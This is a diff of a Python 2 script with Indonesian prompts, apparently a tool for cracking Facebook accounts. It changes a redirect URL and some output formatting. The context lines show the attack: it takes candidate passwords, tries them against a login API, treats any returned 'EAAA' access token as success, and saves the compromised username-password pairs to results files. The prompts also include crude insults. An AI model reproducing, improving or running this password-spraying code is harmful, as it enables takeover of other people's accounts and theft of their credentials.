@@ -129,7 +129,7 @@ def yayanxd():
         open('.memek.txt', 'w').write(kontol)
    
         raw_input(' %s[•]%s TEKAN ENTER BANGSAD!! '%(O,N));wuhan(kontol)
-        os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
+        os.system('xdg-open https://www.facebook.com/clubfunbike')
         moch_yayan()
     except KeyError:
         print '\n\n %s[%s!%s] TOKEN NYA SALAH KENTOD!!'%(N,M,N);time.sleep(2);yayanxd()
@@ -592,7 +592,7 @@ class __crack__:
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
                 pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
-                print ' [*] crack dengan kata sandi -> [ %s%s%s ]' % (M, pwek, N)
+                print ' [•] crack dengan kata sandi -> [ %s%s%s ]' % (M, pwek, N)
                 if pwek == '':
                     print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                 elif len(pwek)<=5:
@@ -681,7 +681,7 @@ class __crack__:
                 loop +=1
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r  %s[->]  %s • %s                 %s' % (H,user,pw,N)
+                print '\r  #000000#89B061%s[->]  %s • %s                 %s' % (H,user,pw,N)
                 wrt = ' [✓]  %s • %s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
